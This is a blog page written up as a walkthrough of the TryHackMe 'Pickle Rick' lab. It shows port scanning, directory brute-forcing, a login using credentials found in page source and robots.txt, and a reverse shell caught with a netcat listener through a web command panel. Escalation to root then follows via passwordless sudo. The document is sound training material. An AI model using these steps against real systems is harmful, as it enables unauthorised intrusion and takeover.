@@ -1,0 +1,213 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Pickle Rick | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Pickle Rick from TryHackMe."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/2_picklerick/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Pickle Rick</h1> <p class="post-description">Pickle Rick from TryHackMe.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/logo.jpeg" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="THM Pickle Rick Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://tryhackme.com/r/room/picklerick" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Welcome here. We have to find the ingredients to turn Rick back into a human (Three flags). <br><br> The first step is to run nmap to get a list of the open ports.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>sec㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.101.216
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-05 16:18 AEDT
+Nmap scan report <span class="k">for </span>10.10.101.216
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 0f:57:d1:ba:51:42:bc:6c:06:c4:b8:4a:7f:32:90:8a <span class="o">(</span>RSA<span class="o">)</span>
+|   256 35:c6:14:4c:6b:92:0c:44:eb:4d:ec:ac:bd:12:0d:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fd:6c:21:28:f8:8b:f1:2e:59:df:fd:5e:24:0c:9a:20 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.94SVN%E<span class="o">=</span>4%D<span class="o">=</span>1/5%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>37664%PV<span class="o">=</span>Y%DS<span class="o">=</span>4%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>677A1
+OS:649%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FB%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10A%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>SE
+OS:Q<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FC%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%TS<span class="o">=</span>A<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FC%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10C%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%I
+OS:I<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FD%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M508ST11NW7%
+OS:O2<span class="o">=</span>M508ST11NW7%O3<span class="o">=</span>M508NNT11NW7%O4<span class="o">=</span>M508ST11NW7%O5<span class="o">=</span>M508ST11NW7%O6<span class="o">=</span>M508ST11
+OS:<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>F4B3%W2<span class="o">=</span>F4B3%W3<span class="o">=</span>F4B3%W4<span class="o">=</span>F4B3%W5<span class="o">=</span>F4B3%W6<span class="o">=</span>F4B3<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W
+OS:<span class="o">=</span>F507%O<span class="o">=</span>M508NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N
+OS:<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0
+OS:%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7
+OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>
+OS:0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: 4 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 5900/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   11.92 ms  10.4.0.1
+2   ... 3
+4   265.31 ms 10.10.101.216
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>39.56 seconds
+</code></pre></div></div> <p><br> Now, notice that port 80 is open. Navigate to the ip address in the web browser to view the landing page.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Navigate to “view-source:http://10.10.101.216/” to view the source code of the landing page. Note the username in the comments.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+  <span class="nt">&lt;title&gt;</span>Rick is sup4r cool<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"assets/bootstrap.min.css"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"assets/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"assets/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;style&gt;</span>
+  <span class="nc">.jumbotron</span> <span class="p">{</span>
+    <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url("assets/rickandmorty.jpeg")</span><span class="p">;</span>
+    <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span>
+    <span class="nl">height</span><span class="p">:</span> <span class="m">340px</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+
+  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"jumbotron"</span><span class="nt">&gt;&lt;/div&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>Help Morty!<span class="nt">&lt;/h1&gt;&lt;/br&gt;</span>
+    <span class="nt">&lt;p&gt;</span>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!<span class="nt">&lt;/p&gt;&lt;/br&gt;</span>
+    <span class="nt">&lt;p&gt;</span>I need you to <span class="nt">&lt;b&gt;</span>*BURRRP*<span class="nt">&lt;/b&gt;</span>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
+    I have no idea what the <span class="nt">&lt;b&gt;</span>*BURRRRRRRRP*<span class="nt">&lt;/b&gt;</span>, password was! Help Morty, Help!<span class="nt">&lt;/p&gt;&lt;/br&gt;</span>
+  <span class="nt">&lt;/div&gt;</span>
+
+  <span class="c">&lt;!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  --&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/sourcelanding.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page Source" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run ffuf to try and brute-force directories for the web app.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.101.216/FUZZ <span class="nt">-fs</span> 1602,1062
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.101.216/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 1602,1062
+________________________________________________
+
+assets                  [Status: 301, Size: 315, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
+:: Progress: [220557/220557] :: Job [1/1] :: 7514 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
+</span></code></pre></div></div> <p><br> View the robots.txt file and note the string in the file.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/robots.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Robots.txt" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run gobuster looking for source files and other functionalities. Note the login.php page.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.101.216 <span class="nt">-x</span> php,html
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.101.216
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Extensions:              php,html
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1062]
+/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 882]
+/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.101.216/assets/]
+/portal.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /login.php]
+/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/denied.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /login.php]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+Progress: 661671 / 661674 <span class="o">(</span>100.00%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div> <p><br> Run gobuster looking for interesting text files.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.101.216 <span class="nt">-x</span> txt,pdf,bak
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.101.216
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Extensions:              pdf,bak,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.101.216/assets/]
+/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/clue.txt             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 54]
+Progress: 882228 / 882232 <span class="o">(</span>100.00%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div> <p><br> Check out the clue.txt file to see if it gives us something interesting.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Look around the file system for the other ingredient.
+</code></pre></div></div> <p><br> Navigate to the login page and give it a look.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/login.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="The Login Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Login to the page using the username from the landing page comment and the string from the robots.txt. This will redirect us to a Command Panel.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>R1ckRul3s:Wubbalubbadubdub
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/cmdpanel.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="The Command Panel" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Try the whoami just to test the command execution.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/whoami.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Whoami" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Navigate to Revshells to generate a python3 payload.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/revshells.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Whoami" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Start a netcat listener that is listening on the port that was specified in the revshells payload.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-34-42:~# nc <span class="nt">-nlvp</span> 443
+Listening on 0.0.0.0 443
+</code></pre></div></div> <p><br> Use the payload from revshells and use it in the Command Panel and click the Execute button.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/picklerick/execute.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Execute payload" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the listener and catch the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-34-42:~# nc <span class="nt">-nlvp</span> 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.101.216 41078
+<span class="nv">$ </span>
+</code></pre></div></div> <p><br> Use python to upgrade the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@ip-10-10-101-216:/var/www/html<span class="err">$</span>
+</code></pre></div></div> <p><br> Get the first flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ip-10-10-101-216:/var/www/html<span class="nv">$ </span><span class="nb">ls
+ls</span>
+&lt;flagfilename&gt;.txt  clue.txt	 index.html  portal.php
+assets			     denied.php  login.php   robots.txt
+www-data@ip-10-10-101-216:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> &lt;flagfilename&gt;.txt^[[C
+<span class="nb">cat</span> &lt;flagfilename&gt;.txt
+&lt;flag&gt;
+</code></pre></div></div> <p><br> Get the second flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ip-10-10-101-216:/var/www/html<span class="nv">$ </span><span class="nb">cd</span> /home/rick
+<span class="nb">cd</span> /home/rick
+www-data@ip-10-10-101-216:/home/rick<span class="nv">$ </span><span class="nb">ls
+ls</span>
+&lt;second flag file&gt;
+www-data@ip-10-10-101-216:/home/rick<span class="nv">$ </span><span class="nb">cat</span> &lt;second flag file&gt;
+<span class="nb">cat</span> &lt;second flag file&gt;
+&lt;flag&gt;
+</code></pre></div></div> <p><br> Use the sudo -l to see a list of all the commands the current user can execute as sudo. Notice that we can run all command no password.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ip-10-10-101-216:/var/www/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on ip-10-10-101-216:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on ip-10-10-101-216:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div> <p><br> Use sudo su - to switch the user to the root user.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ip-10-10-101-216:/var/www/html<span class="nv">$ </span><span class="nb">sudo </span>su -
+<span class="nb">sudo </span>su -
+</code></pre></div></div> <p><br> Get the third flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ip-10-10-101-216:~# <span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 36
+drwx------  4 root root 4096 Jul 11 10:17 <span class="nb">.</span>
+drwxr-xr-x 23 root root 4096 Jan  5 05:17 ..
+<span class="nt">-rw-r--r--</span>  1 root root   29 Feb 10  2019 &lt;third flag file&gt;
+<span class="nt">-rw-------</span>  1 root root  168 Jul 11 11:18 .bash_history
+<span class="nt">-rw-r--r--</span>  1 root root 3106 Oct 22  2015 .bashrc
+<span class="nt">-rw-r--r--</span>  1 root root  161 Jan  2  2024 .profile
+drwxr-xr-x  4 root root 4096 Jul 11 10:53 snap
+drwx------  2 root root 4096 Feb 10  2019 .ssh
+<span class="nt">-rw-------</span>  1 root root  702 Jul 11 10:17 .viminfo
+root@ip-10-10-101-216:~# &lt;third flag file&gt;
+&lt;third flag file&gt;
+&lt;flag&gt;
+</code></pre></div></div> <p><br> Hopefully you enjoyed the read.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" 